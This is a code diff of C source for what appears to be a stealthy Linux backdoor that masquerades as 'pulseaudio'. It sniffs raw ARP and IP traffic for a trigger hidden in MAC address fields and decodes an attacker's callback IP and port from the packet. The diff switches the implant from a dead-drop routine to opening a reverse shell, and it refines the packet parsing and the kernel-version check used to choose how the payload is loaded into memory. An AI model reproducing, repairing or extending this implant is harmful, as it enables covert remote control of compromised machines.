@@ -6,7 +6,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <linux/if_ether.h>
+#include <netinet/if_ether.h>
 #include <linux/ip.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
@@ -18,7 +18,6 @@
 #include <sys/prctl.h>
 #include <sys/utsname.h>
 
-
 #define NAME "pulseaudio"
 
 extern char ** environ;
@@ -29,26 +28,6 @@ struct c_data {
       unsigned char u_port[2];
       //Callback IP
       unsigned char  u_addr[4];
-};
-
-/* Defined a custom struct to handle both the
-   Ethernet Header and the Arp Header */
-struct arp_hdr {
-	//Ethernet header
-	unsigned char  h_dest[6];     /*Destination MAC*/
-	unsigned char  h_source[6];   /*Source MAC*/
-	unsigned short h_proto;       /*Ether Type*/
-	//ARP header
-	unsigned short ar_hrd;        /*ARP Hardware Type*/
-	unsigned short ar_pro;        /*ARP Protocol Type*/
-	unsigned char  ar_hln;        /*ARP Hardware Length*/
-	unsigned char  ar_pln;        /*ARP Proto Length*/
-	unsigned short ar_op;         /*ARP OP Code*/
-
-	unsigned char ar_sha[6];      /*ARP Sender Hardware Address*/
-	unsigned char ar_sip[4];      /*ARP Sender Proto Address*/
-	unsigned char ar_tha[6];      /*ARP Target Hardware Address*/
-	unsigned char ar_tip[4];      /*ARP Target Proto Address*/
 };
 
 //int reverse_shell(unsigned int, unsigned short);
@@ -64,12 +43,12 @@ int methodID(void)
 	struct utsname data;
 	uname(&data);
 
+	int ver;
 	char *version;
 	char *split = ".";
 
 	version = strtok(data.release,split);
-	// Convert char* to int
-	int ver = *version - '0';
+	ver = atoi(version);
 	
 	//Debug line
 	//printf("Kver is: %s",(char *)data.release);
@@ -78,7 +57,7 @@ int methodID(void)
 	else if (ver < 3){ return 0;}
 	else if (ver == 3){
 		version= strtok(NULL,split);
-		ver = *version - '0';
+		ver = atoi(version);
 		if (ver >= 17){ return 1;}
 		else {return 0;}
 	}
@@ -88,7 +67,6 @@ int methodID(void)
 /* function to allocate mem for payload */
 int lz(int methodID){
 	int loadfd;
-	//char *name = "TArp";
 	if (methodID == 0){
 		loadfd = shm_open(NAME, O_RDWR | O_CREAT, S_IRWXU);
 		if (loadfd < 0) {exit(1);}
@@ -204,18 +182,18 @@ int arp_listener()
 
 		if ( ether->h_proto == ntohs(0x806)){
 
-			struct arp_hdr *arphdr = (struct arp_hdr*)buffer;
+			struct ether_arp *arphdr = (struct ether_arp*)(buffer + sizeof(struct ethhdr));
 			unsigned long first;
 			unsigned long second;
 			unsigned long trigger;
 			
 			// Split MAC field in half using bit shifting
-			first=(arphdr->ar_tha[0]<<16); 
-			first+=(arphdr->ar_tha[1]<<8); 
-			first+=(arphdr->ar_tha[2]); 
-			second=(arphdr->ar_tha[3]<<16); 
-			second+=(arphdr->ar_tha[4]<<8); 
-			second+=(arphdr->ar_tha[5]);
+			first=(arphdr->arp_tha[0]<<16); 
+			first+=(arphdr->arp_tha[1]<<8); 
+			first+=(arphdr->arp_tha[2]); 
+			second=(arphdr->arp_tha[3]<<16); 
+			second+=(arphdr->arp_tha[4]<<8); 
+			second+=(arphdr->arp_tha[5]);
                         
 			trigger = first + second;
                         
@@ -226,14 +204,16 @@ int arp_listener()
 				unsigned int   ip;
                         
 				// Bit shifting to build the return port/IP
-				port=(arphdr->ar_sha[1]<<8) + (arphdr->ar_sha[0]);
-				ip=(arphdr->ar_sha[5]<<24);
-				ip+=(arphdr->ar_sha[4]<<16);
-				ip+=(arphdr->ar_sha[3]<<8);
-				ip+=(arphdr->ar_sha[2]);
+				port=(arphdr->arp_sha[1]<<8) + (arphdr->arp_sha[0]);
+				ip=(arphdr->arp_sha[5]<<24);
+				ip+=(arphdr->arp_sha[4]<<16);
+				ip+=(arphdr->arp_sha[3]<<8);
+				ip+=(arphdr->arp_sha[2]);
                         
+				free(buffer);
 				close(sock_raw);
-				deadDrop(ip,port);
+				//deadDrop(ip,port);
+				reverse_shell(ip,port);
                         
 			}
 		}else if (ether->h_proto == htons(0x800)){
@@ -262,8 +242,10 @@ int arp_listener()
 						ip+=(data->u_addr[1]<<8);
 						ip+=(data->u_addr[0]);
                                 
+						free(buffer);
 						close(sock_raw);
-						deadDrop(ip,port);
+						//deadDrop(ip,port);
+						reverse_shell(ip,port);
 					}
 
 
@@ -286,8 +268,10 @@ int arp_listener()
 						ip+=(data->u_addr[1]<<8);
 						ip+=(data->u_addr[0]);
                                 
+						free(buffer);
 						close(sock_raw);
-						deadDrop(ip,port);
+						//deadDrop(ip,port);
+						reverse_shell(ip,port);
 					}
 				}
 		}
